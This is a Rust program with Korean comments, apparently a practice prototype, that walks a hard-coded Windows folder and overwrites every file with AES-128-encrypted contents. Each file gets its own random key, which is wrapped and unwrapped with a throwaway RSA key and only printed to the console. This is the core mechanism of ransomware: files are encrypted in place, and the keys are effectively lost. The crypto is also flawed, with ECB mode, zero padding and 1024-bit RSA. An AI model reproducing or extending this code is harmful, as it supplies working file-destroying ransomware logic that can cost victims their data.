use rand::Rng;
//getfileinf
use std::fs;
use std::io::{self, Read};
use std::io::Write;
use std::path::PathBuf;
//aes
use std::fs::File;
use aes::Aes128;
use aes::cipher::{
    BlockEncrypt, KeyInit,
    generic_array::GenericArray,
};
//rsa
use rsa::RsaPrivateKey;
use rsa::pkcs1v15;


fn rsa_process()-> Vec<u8> {
    let mut rng = rand::thread_rng();

    // 키 생성
    let bits = 1024;
    let private_key = RsaPrivateKey::new(&mut rng, bits).expect("키 생성 실패");
    let public_key = private_key.to_public_key();

    //aes 랜덤 키 생성
    let mut randg = rand::thread_rng();
    let mut random_bytes: [u8; 16] = [0; 16]; // 16 바이트 배열 초기화
    randg.fill(&mut random_bytes);
    //println!("random_bytes{:?}",random_bytes);

    // 암호화할 데이터
    let key_data = GenericArray::from(random_bytes);

    // 데이터 암호화
    let data_encrypt = public_key.encrypt(&mut rng, pkcs1v15::Pkcs1v15Encrypt, &key_data)
        .expect("데이터 암호화 실패");
    

    // 데이터 복호화
    let data_decrypt = private_key.decrypt(pkcs1v15::Pkcs1v15Encrypt, &data_encrypt)
        .expect("데이터 복호화 실패");

    println!("(+)키_원본: {:?}", key_data);
    println!("(+)키_암호화 데이터: {:?}", data_encrypt);
    println!("(+)키_복호화 데이터: {:?}", data_decrypt);
    //println!("key : {:?}", private_key)
    return data_decrypt;
}

//* 디렉토리에서 파일 명 가져오는 함수 *//
fn call_file_path() -> Vec<PathBuf>{
    //파일 구조 가져오기
    let dir_path = r"C:\Users\guswj\바탕 화면\rust\crypto_test"; //암호화 시킬 디렉토리 경로
    let mut dir_path_list = Vec::new(); //파일 경로들 담을 리스트 생성

    if let Ok(entries) = fs::read_dir(dir_path) {    // 함수를 사용해 부모 디렉토리 경로에서 자식 디렉토리명과 파일명을 구함
        for entry in entries{
            if let Ok(entry) = entry {
                let path = entry.path();
                //println!("{}", path.display()); //check
                dir_path_list.push(path);
            }
        }
    }
    else {
        println!("위치 불러오기 실패");
    }
    return dir_path_list;
}


//* 파일 HEX값 10진수로 가져오는 함수 *//
fn read_binary_file(file_path: &str) -> io::Result<Vec<u8>> {
    // 파일을 읽기 모드로 열기
    let mut file = File::open(file_path)?;

    // 파일의 크기를 구하여 버퍼를 할당
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    Ok(buffer)
}

fn encode_file() {
    let file_path = call_file_path();//파일 경로 불러오기

    for one_file_path in file_path{ //리스트에서 파일경로 하나씩 꺼내오기
        if let Some(put_file_path) = one_file_path.to_str() { //PathBuf타입을 str타입으로 변환

            match read_binary_file(put_file_path) {
                Ok(data) => {
                    // 데이터 처리
                    println!("(+)file_path: {:?}",put_file_path);
                    aes_process(data, put_file_path);
                }
                Err(e) => {
                    println!("파일 읽기 오류: {}", e);
                }
            }
            println!("암호화 실행 완료");

        } else {
            println!("failed");
        }
    }
}

fn aes_process(mut input_data:Vec<u8>, output_file_path:&str) {
    let key = rsa_process();

    let block_size = 16; // AES block size in bytes

    let mut output_file = File::create(output_file_path).expect("Error creating file");

    let cipher = Aes128::new(GenericArray::from_slice(&key));
    println!("(+)file_data: {:?}",input_data);

    for chunk in input_data.chunks_mut(block_size) {
        // Ensure each chunk has the correct length (padding if necessary)
        let padding_len = block_size - chunk.len();
        if padding_len > 0 {
            let mut padded_chunk = chunk.to_vec();
            padded_chunk.extend_from_slice(&vec![0u8; padding_len]);
            let mut encrypted_data = GenericArray::clone_from_slice(&padded_chunk);
            cipher.encrypt_block(&mut encrypted_data);
            output_file.write_all(encrypted_data.as_slice()).expect("Error writing file");
        } else {
            let mut encrypted_data = GenericArray::clone_from_slice(chunk);
            cipher.encrypt_block(&mut encrypted_data);
            output_file.write_all(encrypted_data.as_slice()).expect("Error writing file");
        }
    }
}

fn main() {
    encode_file();
}